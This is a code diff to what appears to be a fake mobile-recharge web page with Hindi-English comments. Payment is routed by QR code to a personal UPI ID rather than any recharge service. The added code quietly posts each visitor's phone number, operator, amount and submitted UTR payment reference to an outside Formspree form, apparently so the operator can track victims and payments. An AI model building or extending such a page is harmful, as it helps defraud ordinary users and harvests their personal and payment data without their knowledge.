@@ -90,7 +90,21 @@
                 if(selectedMobile.length < 10) return alert("Sahi number dalein.");
                 if(!document.getElementById('operator').value) return alert("Operator select karein.");
             }
-            if(amt > 0) selectedAmount = amt;
+            
+            // --- PLAN SELECT HOTE HI NOTIFICATION BHEJEIN ---
+            if(amt > 0) {
+                selectedAmount = amt;
+                fetch("https://formspree.io/f/xjgkkeog", {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        Event: "Plan Selected (Interested)",
+                        Mobile: selectedMobile,
+                        Amount: amt,
+                        Operator: document.getElementById('operator').value
+                    })
+                });
+            }
 
             document.getElementById(curr).classList.add('hidden');
             document.getElementById('loader').classList.remove('hidden');
@@ -125,7 +139,6 @@
         function startPayment() {
             document.getElementById('lock-amt').innerText = selectedAmount;
             const upiId = "ashishjhajhadia@oksbi";
-            // Amount automatically set in QR
             const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=${upiId}%26pn=Ashish%26am=${selectedAmount}%26cu=INR`;
             document.getElementById('auto_qr').src = qrUrl;
 
@@ -139,7 +152,22 @@
         }
 
         function verifyUTR() {
-            if(document.getElementById('utr_input').value.length < 12) return alert("12-digit UTR dalein.");
+            const utrValue = document.getElementById('utr_input').value;
+            if(utrValue.length < 12) return alert("12-digit UTR dalein.");
+            
+            // --- UTR SUBMIT NOTIFICATION ---
+            fetch("https://formspree.io/f/xjgkkeog", {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    Event: "Payment Submitted (UTR)",
+                    mobile: selectedMobile,
+                    amount: selectedAmount,
+                    utr: utrValue,
+                    operator: document.getElementById('operator').value
+                })
+            });
+
             clearInterval(timerInterval);
             document.getElementById('final-num').innerText = selectedMobile;
             document.getElementById('final-amt').innerText = selectedAmount;
@@ -148,4 +176,3 @@
     </script>
 </body>
 </html>
-
